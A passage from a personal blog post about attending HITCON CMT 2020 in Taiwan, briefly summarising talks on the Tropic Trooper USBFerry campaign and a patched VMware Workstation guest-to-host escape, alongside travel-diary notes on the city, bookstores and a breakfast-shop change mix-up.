    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/800f967d9d7614eeecbea3ab1caac9c1d0c2612ccdf9c4f97796376f2e8a7ca3-400-79008d3ef.webp 400w, /generated/assets/images/posts/hitcon-cmt-2020/800f967d9d7614eeecbea3ab1caac9c1d0c2612ccdf9c4f97796376f2e8a7ca3-600-79008d3ef.webp 600w, /generated/assets/images/posts/hitcon-cmt-2020/800f967d9d7614eeecbea3ab1caac9c1d0c2612ccdf9c4f97796376f2e8a7ca3-800-79008d3ef.webp 800w, /generated/assets/images/posts/hitcon-cmt-2020/800f967d9d7614eeecbea3ab1caac9c1d0c2612ccdf9c4f97796376f2e8a7ca3-1000-79008d3ef.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/800f967d9d7614eeecbea3ab1caac9c1d0c2612ccdf9c4f97796376f2e8a7ca3-400-c5de6b301.png 400w, /generated/assets/images/posts/hitcon-cmt-2020/800f967d9d7614eeecbea3ab1caac9c1d0c2612ccdf9c4f97796376f2e8a7ca3-600-c5de6b301.png 600w, /generated/assets/images/posts/hitcon-cmt-2020/800f967d9d7614eeecbea3ab1caac9c1d0c2612ccdf9c4f97796376f2e8a7ca3-800-c5de6b301.png 800w, /generated/assets/images/posts/hitcon-cmt-2020/800f967d9d7614eeecbea3ab1caac9c1d0c2612ccdf9c4f97796376f2e8a7ca3-1000-c5de6b301.png 1000w" type="image/png" />
    <img class="lazy" src="/generated/assets/images/posts/hitcon-cmt-2020/800f967d9d7614eeecbea3ab1caac9c1d0c2612ccdf9c4f97796376f2e8a7ca3-800-c5de6b301.png" width="1790" height="1007" />
  </picture>
</a>

  <figcaption>Tropic Trooper's attack flow (from Trend Micro's <a href="https://www.trendmicro.com/en_us/research/20/e/tropic-troopers-back-usbferry-attack-targets-air-gapped-environments.html">Tropic Trooper’s USBFerry Targets Air-Gapped Networks</a>)</figcaption>
</figure>

<p>Perhaps the most interesting bit was that the researchers noted that the APT group would sometimes “forget” to exclude PDB strings in their malware when dropping new versions into the systems. From there, several intriguing version strings can be extracted from the debug symbol paths. The variant went from having the <code class="language-plaintext highlighter-rouge">PH</code> initial to <code class="language-plaintext highlighter-rouge">UF</code>, and when the name change happened, the directory name also included the word <code class="language-plaintext highlighter-rouge">USBFerry</code>. Going from a no-name project to one with a name means that the project has garnered enough reputation among the group members that they perhaps felt it was necessary to give it a name - and that’s why Trend Micro dubbed the attack “USBFerry.”</p>

<p>This explanation did not sit well with me, though - surely, the APT group wouldn’t be dumb enough to leave the PDB path exposed during the build process, right? To me, this seems more like an intentional move from them to show off, perhaps? Not sure. Either way, I don’t think the PDB symbol paths were left intact just because they “forgot.”
This type of attack is undoubtedly the most gripping to me, though, as the threat actors were obviously highly trained for this level of infiltration.</p>

<h3 id="a-ctf-style-escape-journey-on-vmware-workstation-guest-to-host-rce">A CTF-Style Escape Journey on VMWare Workstation (Guest-to-Host RCE)</h3>

<p>This talk was the one I was the most excited about in Day 1. Vulnerabilities that escape from the VM world to the userland are always considered the holy grail for malware. While fewer and fewer of them exist, this talk shows that it is still possible - well, <em>was</em>, after the vulnerability was patched. This vulnerability was assigned <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-5515">CVE-2019-5515</a> and <a href="https://www.vmware.com/security/advisories/VMSA-2019-0021.html">VMSA-2019-0021</a>, which affects VMWare Workstation 15.5 and other previous 15.x builds. Unfortunately, though, the bug is relatively old, as it was patched some time late last year, so most users are likely invulnerable to this exploit anymore. Either way, it was still very impressive that <a href="https://www.chaitin.cn">Chaitin Technology</a> was able to find such obscure vulnerability.</p>

<figure class="third">
  <a href="/assets/images/posts/hitcon-cmt-2020/238784ffbe8336bfe0653f4afa23643627a92a38dc2d80b2735934994cb28330.jpg">
  <picture>
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/238784ffbe8336bfe0653f4afa23643627a92a38dc2d80b2735934994cb28330-400-dd42054f2.webp 400w, /generated/assets/images/posts/hitcon-cmt-2020/238784ffbe8336bfe0653f4afa23643627a92a38dc2d80b2735934994cb28330-600-dd42054f2.webp 600w, /generated/assets/images/posts/hitcon-cmt-2020/238784ffbe8336bfe0653f4afa23643627a92a38dc2d80b2735934994cb28330-800-dd42054f2.webp 800w, /generated/assets/images/posts/hitcon-cmt-2020/238784ffbe8336bfe0653f4afa23643627a92a38dc2d80b2735934994cb28330-1000-dd42054f2.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/238784ffbe8336bfe0653f4afa23643627a92a38dc2d80b2735934994cb28330-400-99c29c647.jpg 400w, /generated/assets/images/posts/hitcon-cmt-2020/238784ffbe8336bfe0653f4afa23643627a92a38dc2d80b2735934994cb28330-600-99c29c647.jpg 600w, /generated/assets/images/posts/hitcon-cmt-2020/238784ffbe8336bfe0653f4afa23643627a92a38dc2d80b2735934994cb28330-800-99c29c647.jpg 800w, /generated/assets/images/posts/hitcon-cmt-2020/238784ffbe8336bfe0653f4afa23643627a92a38dc2d80b2735934994cb28330-1000-99c29c647.jpg 1000w" type="image/jpeg" />
    <img class="lazy" src="/generated/assets/images/posts/hitcon-cmt-2020/238784ffbe8336bfe0653f4afa23643627a92a38dc2d80b2735934994cb28330-800-99c29c647.jpg" width="4032" height="3024" />
  </picture>
</a>

  <a href="/assets/images/posts/hitcon-cmt-2020/7d5bf761b201530dbfb14d20649a2f404483893a97794181ec3617ef32390964.jpg">
  <picture>
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/7d5bf761b201530dbfb14d20649a2f404483893a97794181ec3617ef32390964-400-f8e86beaa.webp 400w, /generated/assets/images/posts/hitcon-cmt-2020/7d5bf761b201530dbfb14d20649a2f404483893a97794181ec3617ef32390964-600-f8e86beaa.webp 600w, /generated/assets/images/posts/hitcon-cmt-2020/7d5bf761b201530dbfb14d20649a2f404483893a97794181ec3617ef32390964-800-f8e86beaa.webp 800w, /generated/assets/images/posts/hitcon-cmt-2020/7d5bf761b201530dbfb14d20649a2f404483893a97794181ec3617ef32390964-1000-f8e86beaa.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/7d5bf761b201530dbfb14d20649a2f404483893a97794181ec3617ef32390964-400-49907c1de.jpg 400w, /generated/assets/images/posts/hitcon-cmt-2020/7d5bf761b201530dbfb14d20649a2f404483893a97794181ec3617ef32390964-600-49907c1de.jpg 600w, /generated/assets/images/posts/hitcon-cmt-2020/7d5bf761b201530dbfb14d20649a2f404483893a97794181ec3617ef32390964-800-49907c1de.jpg 800w, /generated/assets/images/posts/hitcon-cmt-2020/7d5bf761b201530dbfb14d20649a2f404483893a97794181ec3617ef32390964-1000-49907c1de.jpg 1000w" type="image/jpeg" />
    <img class="lazy" src="/generated/assets/images/posts/hitcon-cmt-2020/7d5bf761b201530dbfb14d20649a2f404483893a97794181ec3617ef32390964-800-49907c1de.jpg" width="4032" height="3024" />
  </picture>
</a>

  <a href="/assets/images/posts/hitcon-cmt-2020/423d574586195950fa11e17d1caf225d546a9851a5a65c8f683465dc46d8b0a0.jpg">
  <picture>
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/423d574586195950fa11e17d1caf225d546a9851a5a65c8f683465dc46d8b0a0-400-1d4cc3512.webp 400w, /generated/assets/images/posts/hitcon-cmt-2020/423d574586195950fa11e17d1caf225d546a9851a5a65c8f683465dc46d8b0a0-600-1d4cc3512.webp 600w, /generated/assets/images/posts/hitcon-cmt-2020/423d574586195950fa11e17d1caf225d546a9851a5a65c8f683465dc46d8b0a0-800-1d4cc3512.webp 800w, /generated/assets/images/posts/hitcon-cmt-2020/423d574586195950fa11e17d1caf225d546a9851a5a65c8f683465dc46d8b0a0-1000-1d4cc3512.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/423d574586195950fa11e17d1caf225d546a9851a5a65c8f683465dc46d8b0a0-400-d64ba0168.jpg 400w, /generated/assets/images/posts/hitcon-cmt-2020/423d574586195950fa11e17d1caf225d546a9851a5a65c8f683465dc46d8b0a0-600-d64ba0168.jpg 600w, /generated/assets/images/posts/hitcon-cmt-2020/423d574586195950fa11e17d1caf225d546a9851a5a65c8f683465dc46d8b0a0-800-d64ba0168.jpg 800w, /generated/assets/images/posts/hitcon-cmt-2020/423d574586195950fa11e17d1caf225d546a9851a5a65c8f683465dc46d8b0a0-1000-d64ba0168.jpg 1000w" type="image/jpeg" />
    <img class="lazy" src="/generated/assets/images/posts/hitcon-cmt-2020/423d574586195950fa11e17d1caf225d546a9851a5a65c8f683465dc46d8b0a0-800-d64ba0168.jpg" width="4032" height="3024" />
  </picture>
</a>

</figure>

<p>So, where was the exploit found? The vulnerability lies within the virtual e1000e ethernet driver. With a bunch of out-of-bound writes, the threat actor could successfully execute a RCE to the host machine. Unfortunately, a lot of what was featured in the talk was and is outside of my expertise, and the team did not release an official write-up regarding this vulnerability. As much as I’d love to look more into the case, there isn’t a whole lot I can base my research off of (and no, I do not have any photos outside of the 3 featured above).</p>

<h3 id="end-of-day-1">End of Day 1</h3>

<p>Day 1 was exhausting.</p>

<p>Though I guess it applies to any conferences I go to these days, as they are typically filled with non-stop information barrage. Didn’t help that I only slept for a couple of hours at the hostel the day prior. From the topics presented throughout the entire day, I was the most intrigued with presentations like the air-gapped targeted attack and the real-world AD attack.</p>

<p>Compared to last year though, the day one experience was less exciting this year around. Not sure if it was because I didn’t visit the booth events or because the talks on that particular day didn’t interest me enough. I think it would certainly help if I had someone else go with me.</p>

<figure>
  <a href="/assets/images/posts/hitcon-cmt-2020/681E1E8F47E641199C660E0CC66952853225C1755D1C6C8DF119F5F878C0F863.jpg">
  <picture>
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/681E1E8F47E641199C660E0CC66952853225C1755D1C6C8DF119F5F878C0F863-400-92a5d0c61.webp 400w, /generated/assets/images/posts/hitcon-cmt-2020/681E1E8F47E641199C660E0CC66952853225C1755D1C6C8DF119F5F878C0F863-600-92a5d0c61.webp 600w, /generated/assets/images/posts/hitcon-cmt-2020/681E1E8F47E641199C660E0CC66952853225C1755D1C6C8DF119F5F878C0F863-800-92a5d0c61.webp 800w, /generated/assets/images/posts/hitcon-cmt-2020/681E1E8F47E641199C660E0CC66952853225C1755D1C6C8DF119F5F878C0F863-1000-92a5d0c61.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/681E1E8F47E641199C660E0CC66952853225C1755D1C6C8DF119F5F878C0F863-400-9de963de0.jpg 400w, /generated/assets/images/posts/hitcon-cmt-2020/681E1E8F47E641199C660E0CC66952853225C1755D1C6C8DF119F5F878C0F863-600-9de963de0.jpg 600w, /generated/assets/images/posts/hitcon-cmt-2020/681E1E8F47E641199C660E0CC66952853225C1755D1C6C8DF119F5F878C0F863-800-9de963de0.jpg 800w, /generated/assets/images/posts/hitcon-cmt-2020/681E1E8F47E641199C660E0CC66952853225C1755D1C6C8DF119F5F878C0F863-1000-9de963de0.jpg 1000w" type="image/jpeg" />
    <img class="lazy" src="/generated/assets/images/posts/hitcon-cmt-2020/681E1E8F47E641199C660E0CC66952853225C1755D1C6C8DF119F5F878C0F863-800-9de963de0.jpg" width="4032" height="1728" />
  </picture>
</a>

  <figcaption>Events are far more enjoyable if you have a friend to go with - which I did not. Ah well, guess I'll have this mochi ice cream by myself.</figcaption>
</figure>

<p>Anyways, after the event, I thought I’d take this opportunity to look around the city. Y’know, to take in the capital of the island, since I’m more of a suburb city type of person - still not used to all this crowd and whatnot. The street near the hostel I stayed at was a bustling one. The entire street was lively, but feels… I don’t know, kinda dead men walking in a way? Not sure if it was just me, but I felt certain tension in the air as I was walking around the streets. Maybe I just was not used to the city, still, or I was simply tired. Either that, or busy cities are always like this.</p>

<figure class="half">
  <a href="/assets/images/posts/hitcon-cmt-2020/244613BBA357BD6D3F57FC5BB5C4F4FE7B96AD22F34DDAE50FAC823609BA0E89.jpg">
  <picture>
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/244613BBA357BD6D3F57FC5BB5C4F4FE7B96AD22F34DDAE50FAC823609BA0E89-400-a166f69d9.webp 400w, /generated/assets/images/posts/hitcon-cmt-2020/244613BBA357BD6D3F57FC5BB5C4F4FE7B96AD22F34DDAE50FAC823609BA0E89-600-a166f69d9.webp 600w, /generated/assets/images/posts/hitcon-cmt-2020/244613BBA357BD6D3F57FC5BB5C4F4FE7B96AD22F34DDAE50FAC823609BA0E89-800-a166f69d9.webp 800w, /generated/assets/images/posts/hitcon-cmt-2020/244613BBA357BD6D3F57FC5BB5C4F4FE7B96AD22F34DDAE50FAC823609BA0E89-1000-a166f69d9.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/244613BBA357BD6D3F57FC5BB5C4F4FE7B96AD22F34DDAE50FAC823609BA0E89-400-590b103c8.jpg 400w, /generated/assets/images/posts/hitcon-cmt-2020/244613BBA357BD6D3F57FC5BB5C4F4FE7B96AD22F34DDAE50FAC823609BA0E89-600-590b103c8.jpg 600w, /generated/assets/images/posts/hitcon-cmt-2020/244613BBA357BD6D3F57FC5BB5C4F4FE7B96AD22F34DDAE50FAC823609BA0E89-800-590b103c8.jpg 800w, /generated/assets/images/posts/hitcon-cmt-2020/244613BBA357BD6D3F57FC5BB5C4F4FE7B96AD22F34DDAE50FAC823609BA0E89-1000-590b103c8.jpg 1000w" type="image/jpeg" />
    <img class="lazy" src="/generated/assets/images/posts/hitcon-cmt-2020/244613BBA357BD6D3F57FC5BB5C4F4FE7B96AD22F34DDAE50FAC823609BA0E89-800-590b103c8.jpg" width="3024" height="3024" />
  </picture>
</a>

  <a href="/assets/images/posts/hitcon-cmt-2020/49E8B1C64279AA8982E9949D690F7ECB64E43174B10A7E07AB3221DFE647A76B.jpg">
  <picture>
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/49E8B1C64279AA8982E9949D690F7ECB64E43174B10A7E07AB3221DFE647A76B-400-94c281ca7.webp 400w, /generated/assets/images/posts/hitcon-cmt-2020/49E8B1C64279AA8982E9949D690F7ECB64E43174B10A7E07AB3221DFE647A76B-600-94c281ca7.webp 600w, /generated/assets/images/posts/hitcon-cmt-2020/49E8B1C64279AA8982E9949D690F7ECB64E43174B10A7E07AB3221DFE647A76B-800-94c281ca7.webp 800w, /generated/assets/images/posts/hitcon-cmt-2020/49E8B1C64279AA8982E9949D690F7ECB64E43174B10A7E07AB3221DFE647A76B-1000-94c281ca7.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/49E8B1C64279AA8982E9949D690F7ECB64E43174B10A7E07AB3221DFE647A76B-400-af65a7ce3.jpg 400w, /generated/assets/images/posts/hitcon-cmt-2020/49E8B1C64279AA8982E9949D690F7ECB64E43174B10A7E07AB3221DFE647A76B-600-af65a7ce3.jpg 600w, /generated/assets/images/posts/hitcon-cmt-2020/49E8B1C64279AA8982E9949D690F7ECB64E43174B10A7E07AB3221DFE647A76B-800-af65a7ce3.jpg 800w, /generated/assets/images/posts/hitcon-cmt-2020/49E8B1C64279AA8982E9949D690F7ECB64E43174B10A7E07AB3221DFE647A76B-1000-af65a7ce3.jpg 1000w" type="image/jpeg" />
    <img class="lazy" src="/generated/assets/images/posts/hitcon-cmt-2020/49E8B1C64279AA8982E9949D690F7ECB64E43174B10A7E07AB3221DFE647A76B-800-af65a7ce3.jpg" width="3024" height="3024" />
  </picture>
</a>

  <figcaption>Bustling city with enmity in the air. Was it just me? Probably.</figcaption>
</figure>

<p>Anyhow, I dropped by the nearby department stores and bookstores to take my mind off things after getting some tea and dumplings as supper. Every time I go to bookstores and whatnot, I wish I could go out <em>not</em> empty-handed - but nah, I kept my cool and decided not to spend my already tight budget. It’s been a couple of grueling months not being able to afford entertainment. Hope I can get a new job soon. Still, it was cool seeing illustration books and oddities in places like these - especially seeing bookshelves full of Fate stuff.</p>

<figure class="third">
  <a href="/assets/images/posts/hitcon-cmt-2020/213AB494B3A02F9FD0D87F0A1C864A5B74272999BB3E79E718E0F7A1A513A1FD.jpg">
  <picture>
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/213AB494B3A02F9FD0D87F0A1C864A5B74272999BB3E79E718E0F7A1A513A1FD-400-2c35a47c7.webp 400w, /generated/assets/images/posts/hitcon-cmt-2020/213AB494B3A02F9FD0D87F0A1C864A5B74272999BB3E79E718E0F7A1A513A1FD-600-2c35a47c7.webp 600w, /generated/assets/images/posts/hitcon-cmt-2020/213AB494B3A02F9FD0D87F0A1C864A5B74272999BB3E79E718E0F7A1A513A1FD-800-2c35a47c7.webp 800w, /generated/assets/images/posts/hitcon-cmt-2020/213AB494B3A02F9FD0D87F0A1C864A5B74272999BB3E79E718E0F7A1A513A1FD-1000-2c35a47c7.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/213AB494B3A02F9FD0D87F0A1C864A5B74272999BB3E79E718E0F7A1A513A1FD-400-0ca84bd34.jpg 400w, /generated/assets/images/posts/hitcon-cmt-2020/213AB494B3A02F9FD0D87F0A1C864A5B74272999BB3E79E718E0F7A1A513A1FD-600-0ca84bd34.jpg 600w, /generated/assets/images/posts/hitcon-cmt-2020/213AB494B3A02F9FD0D87F0A1C864A5B74272999BB3E79E718E0F7A1A513A1FD-800-0ca84bd34.jpg 800w, /generated/assets/images/posts/hitcon-cmt-2020/213AB494B3A02F9FD0D87F0A1C864A5B74272999BB3E79E718E0F7A1A513A1FD-1000-0ca84bd34.jpg 1000w" type="image/jpeg" />
    <img class="lazy" src="/generated/assets/images/posts/hitcon-cmt-2020/213AB494B3A02F9FD0D87F0A1C864A5B74272999BB3E79E718E0F7A1A513A1FD-800-0ca84bd34.jpg" width="3024" height="3024" />
  </picture>
</a>

  <a href="/assets/images/posts/hitcon-cmt-2020/2EE1ED6A4C22D7BD463E1B37C1C38419D75619FA378C7AB9B0E3968FE3746342.jpg">
  <picture>
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/2EE1ED6A4C22D7BD463E1B37C1C38419D75619FA378C7AB9B0E3968FE3746342-400-7c208e5b9.webp 400w, /generated/assets/images/posts/hitcon-cmt-2020/2EE1ED6A4C22D7BD463E1B37C1C38419D75619FA378C7AB9B0E3968FE3746342-600-7c208e5b9.webp 600w, /generated/assets/images/posts/hitcon-cmt-2020/2EE1ED6A4C22D7BD463E1B37C1C38419D75619FA378C7AB9B0E3968FE3746342-800-7c208e5b9.webp 800w, /generated/assets/images/posts/hitcon-cmt-2020/2EE1ED6A4C22D7BD463E1B37C1C38419D75619FA378C7AB9B0E3968FE3746342-1000-7c208e5b9.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/2EE1ED6A4C22D7BD463E1B37C1C38419D75619FA378C7AB9B0E3968FE3746342-400-3f7d1d134.jpg 400w, /generated/assets/images/posts/hitcon-cmt-2020/2EE1ED6A4C22D7BD463E1B37C1C38419D75619FA378C7AB9B0E3968FE3746342-600-3f7d1d134.jpg 600w, /generated/assets/images/posts/hitcon-cmt-2020/2EE1ED6A4C22D7BD463E1B37C1C38419D75619FA378C7AB9B0E3968FE3746342-800-3f7d1d134.jpg 800w, /generated/assets/images/posts/hitcon-cmt-2020/2EE1ED6A4C22D7BD463E1B37C1C38419D75619FA378C7AB9B0E3968FE3746342-1000-3f7d1d134.jpg 1000w" type="image/jpeg" />
    <img class="lazy" src="/generated/assets/images/posts/hitcon-cmt-2020/2EE1ED6A4C22D7BD463E1B37C1C38419D75619FA378C7AB9B0E3968FE3746342-800-3f7d1d134.jpg" width="3024" height="3024" />
  </picture>
</a>

  <a href="/assets/images/posts/hitcon-cmt-2020/8AE5D29CBE6BDB016AA481BD7BC9F589847945444F72BADAC635C586DE4801C2.jpg">
  <picture>
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/8AE5D29CBE6BDB016AA481BD7BC9F589847945444F72BADAC635C586DE4801C2-400-0c1a4091a.webp 400w, /generated/assets/images/posts/hitcon-cmt-2020/8AE5D29CBE6BDB016AA481BD7BC9F589847945444F72BADAC635C586DE4801C2-600-0c1a4091a.webp 600w, /generated/assets/images/posts/hitcon-cmt-2020/8AE5D29CBE6BDB016AA481BD7BC9F589847945444F72BADAC635C586DE4801C2-800-0c1a4091a.webp 800w, /generated/assets/images/posts/hitcon-cmt-2020/8AE5D29CBE6BDB016AA481BD7BC9F589847945444F72BADAC635C586DE4801C2-1000-0c1a4091a.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/8AE5D29CBE6BDB016AA481BD7BC9F589847945444F72BADAC635C586DE4801C2-400-b93934329.jpg 400w, /generated/assets/images/posts/hitcon-cmt-2020/8AE5D29CBE6BDB016AA481BD7BC9F589847945444F72BADAC635C586DE4801C2-600-b93934329.jpg 600w, /generated/assets/images/posts/hitcon-cmt-2020/8AE5D29CBE6BDB016AA481BD7BC9F589847945444F72BADAC635C586DE4801C2-800-b93934329.jpg 800w, /generated/assets/images/posts/hitcon-cmt-2020/8AE5D29CBE6BDB016AA481BD7BC9F589847945444F72BADAC635C586DE4801C2-1000-b93934329.jpg 1000w" type="image/jpeg" />
    <img class="lazy" src="/generated/assets/images/posts/hitcon-cmt-2020/8AE5D29CBE6BDB016AA481BD7BC9F589847945444F72BADAC635C586DE4801C2-800-b93934329.jpg" width="3024" height="3024" />
  </picture>
</a>

  <figcaption>Ah yes, books and foldables that I can't afford.</figcaption>
</figure>

<h2 id="day-2">Day 2</h2>

<p>Feeling much more refreshed, I got ready, checked out at the hostel and went out.</p>

<p>As I was heading out, I noticed that there a small breakfast shop just beneath the hostel. It seemed like a good moms’n’pops type of breakfast place. Always enjoyed this aspect of Taiwan, where local restaurants feel truly local instead of “just another chain fast food store” type of deal.</p>

<p>Anyhow, I got a sandwich that was like, $35 NTD (~1 USD) or something and paid with a $1000 NTD (~$35 USD) bill. The woman who was busy working and frying food at the counter hastily took my bill and got me the change - until moments after I realized she literally handed me back another $1000 NTD bill with $465 dollars in change. I stood there for like, 30 seconds, thinking that it must have been a mistake, but should I tell her? I ended up asking “hey, uh, this change doesn’t look quite right?” She took a look at the change, and realized what a huge mistake she made and replaced the $1000 NTD note with a $500 NTD one. That’s more like it.</p>

<p>As I was making my way to the nearby subway station, I pondered to myself, “what would have happened if I didn’t tell her about the change?” Y’know, I could have easily made some money then and there - and I know that would be wrong. The idea of it possibly happening though. The moment of panic that they’d realize that chunk of their money would be missing by the end of the day. They sure didn’t look poor, but they didn’t look like they were swimming in money either. What if that loss of money impacted the rest of their week or even month? Since we don’t know what their financial situation. It’s food for thought.</p>

<figure class="third">
  <a href="/assets/images/posts/hitcon-cmt-2020/8A8970797E100F762E563458C1AA4AF46F614DBBC6B94FDDD0E8BEB63C3EA314.jpg">
  <picture>
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/8A8970797E100F762E563458C1AA4AF46F614DBBC6B94FDDD0E8BEB63C3EA314-400-96d7dd7b7.webp 400w, /generated/assets/images/posts/hitcon-cmt-2020/8A8970797E100F762E563458C1AA4AF46F614DBBC6B94FDDD0E8BEB63C3EA314-600-96d7dd7b7.webp 600w, /generated/assets/images/posts/hitcon-cmt-2020/8A8970797E100F762E563458C1AA4AF46F614DBBC6B94FDDD0E8BEB63C3EA314-800-96d7dd7b7.webp 800w, /generated/assets/images/posts/hitcon-cmt-2020/8A8970797E100F762E563458C1AA4AF46F614DBBC6B94FDDD0E8BEB63C3EA314-1000-96d7dd7b7.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/8A8970797E100F762E563458C1AA4AF46F614DBBC6B94FDDD0E8BEB63C3EA314-400-de61531e0.jpg 400w, /generated/assets/images/posts/hitcon-cmt-2020/8A8970797E100F762E563458C1AA4AF46F614DBBC6B94FDDD0E8BEB63C3EA314-600-de61531e0.jpg 600w, /generated/assets/images/posts/hitcon-cmt-2020/8A8970797E100F762E563458C1AA4AF46F614DBBC6B94FDDD0E8BEB63C3EA314-800-de61531e0.jpg 800w, /generated/assets/images/posts/hitcon-cmt-2020/8A8970797E100F762E563458C1AA4AF46F614DBBC6B94FDDD0E8BEB63C3EA314-1000-de61531e0.jpg 1000w" type="image/jpeg" />
    <img class="lazy" src="/generated/assets/images/posts/hitcon-cmt-2020/8A8970797E100F762E563458C1AA4AF46F614DBBC6B94FDDD0E8BEB63C3EA314-800-de61531e0.jpg" width="4032" height="2268" />
  </picture>
</a>

  <a href="/assets/images/posts/hitcon-cmt-2020/161FBBB1454B70E440C900E55EF3E6FBBAEB12A858FEBD595C5767704930DD9C.jpg">
  <picture>
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/161FBBB1454B70E440C900E55EF3E6FBBAEB12A858FEBD595C5767704930DD9C-400-4d474700a.webp 400w, /generated/assets/images/posts/hitcon-cmt-2020/161FBBB1454B70E440C900E55EF3E6FBBAEB12A858FEBD595C5767704930DD9C-600-4d474700a.webp 600w, /generated/assets/images/posts/hitcon-cmt-2020/161FBBB1454B70E440C900E55EF3E6FBBAEB12A858FEBD595C5767704930DD9C-800-4d474700a.webp 800w, /generated/assets/images/posts/hitcon-cmt-2020/161FBBB1454B70E440C900E55EF3E6FBBAEB12A858FEBD595C5767704930DD9C-1000-4d474700a.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/161FBBB1454B70E440C900E55EF3E6FBBAEB12A858FEBD595C5767704930DD9C-400-150c666e3.jpg 400w, /generated/assets/images/posts/hitcon-cmt-2020/161FBBB1454B70E440C900E55EF3E6FBBAEB12A858FEBD595C5767704930DD9C-600-150c666e3.jpg 600w, /generated/assets/images/posts/hitcon-cmt-2020/161FBBB1454B70E440C900E55EF3E6FBBAEB12A858FEBD595C5767704930DD9C-800-150c666e3.jpg 800w, /generated/assets/images/posts/hitcon-cmt-2020/161FBBB1454B70E440C900E55EF3E6FBBAEB12A858FEBD595C5767704930DD9C-1000-150c666e3.jpg 1000w" type="image/jpeg" />
    <img class="lazy" src="/generated/assets/images/posts/hitcon-cmt-2020/161FBBB1454B70E440C900E55EF3E6FBBAEB12A858FEBD595C5767704930DD9C-800-150c666e3.jpg" width="4032" height="2268" />
  </picture>
</a>

  <a href="/assets/images/posts/hitcon-cmt-2020/B31F8A8057C4EA0FEFDCE21B46064A11B329B394E2C45BA1870D0DEF93AE2582.jpg">
  <picture>
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/B31F8A8057C4EA0FEFDCE21B46064A11B329B394E2C45BA1870D0DEF93AE2582-400-61cccc335.webp 400w, /generated/assets/images/posts/hitcon-cmt-2020/B31F8A8057C4EA0FEFDCE21B46064A11B329B394E2C45BA1870D0DEF93AE2582-600-61cccc335.webp 600w, /generated/assets/images/posts/hitcon-cmt-2020/B31F8A8057C4EA0FEFDCE21B46064A11B329B394E2C45BA1870D0DEF93AE2582-800-61cccc335.webp 800w, /generated/assets/images/posts/hitcon-cmt-2020/B31F8A8057C4EA0FEFDCE21B46064A11B329B394E2C45BA1870D0DEF93AE2582-1000-61cccc335.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/B31F8A8057C4EA0FEFDCE21B46064A11B329B394E2C45BA1870D0DEF93AE2582-400-7eaa022c4.jpg 400w, /generated/assets/images/posts/hitcon-cmt-2020/B31F8A8057C4EA0FEFDCE21B46064A11B329B394E2C45BA1870D0DEF93AE2582-600-7eaa022c4.jpg 600w, /generated/assets/images/posts/hitcon-cmt-2020/B31F8A8057C4EA0FEFDCE21B46064A11B329B394E2C45BA1870D0DEF93AE2582-800-7eaa022c4.jpg 800w, /generated/assets/images/posts/hitcon-cmt-2020/B31F8A8057C4EA0FEFDCE21B46064A11B329B394E2C45BA1870D0DEF93AE2582-1000-7eaa022c4.jpg 1000w" type="image/jpeg" />
    <img class="lazy" src="/generated/assets/images/posts/hitcon-cmt-2020/B31F8A8057C4EA0FEFDCE21B46064A11B329B394E2C45BA1870D0DEF93AE2582-800-7eaa022c4.jpg" width="4032" height="2268" />
  </picture>
</a>

  <figcaption>Attendees waiting for the shuttle bus to come.</figcaption>
</figure>

<h3 id="day-2-agenda">Day 2 Agenda</h3>

<p>The first period looked very promising compared to the first day. Study regarding recent DVR/IoT DDoS attacks, smart card duping, bug bounty experience, and breaking a Galaxy S10 - all promising stuff. I ended up picking the S10 Secure Boot attack talk - we’ll get to why I ended up choosing that one later.</p>

<figure>
  <a href="/assets/images/posts/hitcon-cmt-2020/E3C78D63AD19E52D90910170E2228D361C43D0A07840D7E4E477E7CCF3EAE9ED.jpg">
  <picture>
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/E3C78D63AD19E52D90910170E2228D361C43D0A07840D7E4E477E7CCF3EAE9ED-400-10ebfad78.webp 400w, /generated/assets/images/posts/hitcon-cmt-2020/E3C78D63AD19E52D90910170E2228D361C43D0A07840D7E4E477E7CCF3EAE9ED-600-10ebfad78.webp 600w, /generated/assets/images/posts/hitcon-cmt-2020/E3C78D63AD19E52D90910170E2228D361C43D0A07840D7E4E477E7CCF3EAE9ED-800-10ebfad78.webp 800w, /generated/assets/images/posts/hitcon-cmt-2020/E3C78D63AD19E52D90910170E2228D361C43D0A07840D7E4E477E7CCF3EAE9ED-1000-10ebfad78.webp 1000w" type="image/webp" />
